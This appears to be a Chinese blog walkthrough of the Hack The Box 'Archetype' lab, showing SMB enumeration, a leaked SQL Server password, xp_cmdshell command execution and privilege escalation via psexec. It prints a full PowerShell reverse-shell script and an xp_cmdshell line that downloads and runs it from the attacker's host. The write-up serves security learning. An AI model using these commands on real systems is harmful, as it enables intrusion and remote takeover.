---
title: HackBox---ArcheType
date: 2022-11-20 20:42:20
author: ReadPond
tags:
- HackBox
categories:
- 靶场
keywords: 
top: true
index_img: /img/202302091327880.png
banner_img: /img/202302091327880.png
---

### ArcheType

#### 一、问题

-   Which TCP port is hosting a database server?(哪个TCP端口托管数据库服务器？)
    -   1433
-   What is the name of the non-Administrative share available over SMB?(SMB上可用的非管理共享的名称是什么？)
    -   backups
-   What is the password identified in the file on the SMB share?(SMB共享文件中标识的密码是什么？)
    -   M3g4c0rp123
-   What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?(可以使用Impacket集合中的哪个脚本来建立与Microsoft SQL Server的身份验证连接？)
    -   mssqlclient.py
-   What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?(可以使用Microsoft SQL Server的哪些扩展存储过程来生成Windows命令shell？)
    -   xp_cmdshell
-   What script can be used in order to search possible paths to escalate privileges on Windows hosts?(可以使用什么脚本来搜索可能的路径以升级Windows主机上的权限？)
    -   winpeas
-   What file contains the administrator's password?(哪个文件包含管理员密码？)
    -   ConsoleHost_history.txt

#### 二、过程

-   首先获取到靶场IP地址：10.129.147.7
-   一般的渗透思路都是域名-IP-端口-服务，这里已经给出IP，所以下一步考虑这个IP下开了哪些端口，端口上又有什么服务

```
nmap -sC -sV 10.129.147.7
```

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111733612.png)

根据第二个问题需要用到SMB，所以得用Kali中自带的smbclient(smbclient命令属于[samba](https://so.csdn.net/so/search?q=samba&spm=1001.2101.3001.7020)套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。)

```
smbclient -N -L 10.129.147.7

-B<ip地址>：传送广播数据包时所用的IP地址；
-d<排错层级>：指定记录文件所记载事件的详细程度；
-E：将信息送到标准错误输出设备；
-h：显示帮助；
-i<范围>：设置NetBIOS名称范围；
-I<IP地址>：指定服务器的IP地址；
-l<记录文件>：指定记录文件的名称；
-L：显示服务器端所分享出来的所有资源；
-M<NetBIOS名称>：可利用WinPopup协议，将信息送给选项中所指定的主机；
-n<NetBIOS名称>：指定用户端所要使用的NetBIOS名称；
-N：不用询问密码；
-O<连接槽选项>：设置用户端TCP连接槽的选项；
-p<TCP连接端口>：指定服务器端TCP连接端口编号；
-R<名称解析顺序>：设置NetBIOS名称解析的顺序；
-s<目录>：指定smb.conf所在的目录；
-t<服务器字码>：设置用何种字符码来解析服务器端的文件名称；
-T<tar选项>：备份服务器端分享的全部文件，并打包成tar格式的文件；
-U<用户名称>：指定用户名称；
-w<工作群组>：指定工作群组名称。
```

![image-20230211175123427](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111751431.png)

-   下来就是进入到这个backups里面看看里面都有什么东西

```
smbclient -N //10.129.147.7/backups
ls
get prod.dtsConfig
cat prod.dtsConfig  ---重新启动一个终端
```


![image-20230211175644838](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111756797.png)

```
DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
-   找到账号和密码，下一步就是利用这个账号和密码登录这个SQL
-   Kali中使用了impacket-mssqlclient工具连接SQL，这是第三方工具需要从github上下载

```
git clone https://github.com/CoreSecurity/impacket.git
cd impacket/
python setup.py install
```

![image-20230211180809997](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111808130.png)

-   使用`SELECT IS_SRVROLEMEMBER('sysadmin')`查看当前是否有sysadmin（最高级别）的 SQL Server 权限，返回1，则表示具有该权限

![image-20230211181030596](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111810616.png)

-   有了权限使用xp_cmdshell 并在主机上获得 RCE
-   

```
enable_xp_cmdshell             //开启xp_cmdshell，如果不能则需要执行下边几行命令
EXEC sp_configure 'Show Advanced Options', 1;  //允许修改数据库高级配置选项
reconfigure;                                   //确认上面的操作
EXEC sp_configure 'xp_cmdshell', 1;            //启用xp_cmdshell，允许SQL server执行系统命令
reconfigure;                                   //确认上面的操作
xp_cmdshell "whoami"                           //查看当前权限
```



![image-20230211181532383](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111815616.png)

往下就是要反弹shell

在桌面新建一个文件shell.ps1，在文件当中写入如下内容：

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.93",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

把里面的IP换成本地IP地址(使用ifconfig—然后查看tun0的IP)

重新开启两个终端一个开启80，一个开启443

```
python3 -m http.server 80
nc -lvnp 4443
```

![image-20230211191418541](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111914937.png)

![image-20230211191446735](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111914897.png)

在SQL终端下使用

```
xp_cmdshell "powershell "Import-Module Microsoft.PowerShell.Utility;IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.93/shell.ps1\");""
```

![image-20230211191854791](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111918835.png)

![image-20230211191917351](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111919736.png)

![image-20230211191958289](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111921279.png)

以上在443终端下，出现#号说明反弹成功

此时使用：

```
type C:\Users\sql_svc\Desktop\user.txt
```

![image-20230211192216167](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111922531.png)

-   拿到第一个flag
-   使用如下命令获取到powershell的历史记录

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx
```

![image-20230211192539209](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111925178.png)

我们可以看出该用户执行过命令 `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`。该命令的作用是将主机ARchetype上的backups文件夹映射到自己的T盘，后面紧随着用户名和密码。

使用命令`impacket-psexec administrator@10.129.147.7`进行提权

![image-20230211192843921](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111928130.png)

在`type C:\Users\Administrator\Desktop\root.txt`得到最后一个flag

![image-20230211193246449](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111932561.png)

#### 参考链接：

-   https://wangchujiang.com/linux-command/c/smbclient.html
-   https://www.cnblogs.com/masses0x1/p/15780893.html
-   https://blog.csdn.net/XXX26/article/details/118113329
-   https://www.freebuf.com/articles/web/175208.html
-   https://www.cnblogs.com/sup3rman/p/12381874.html
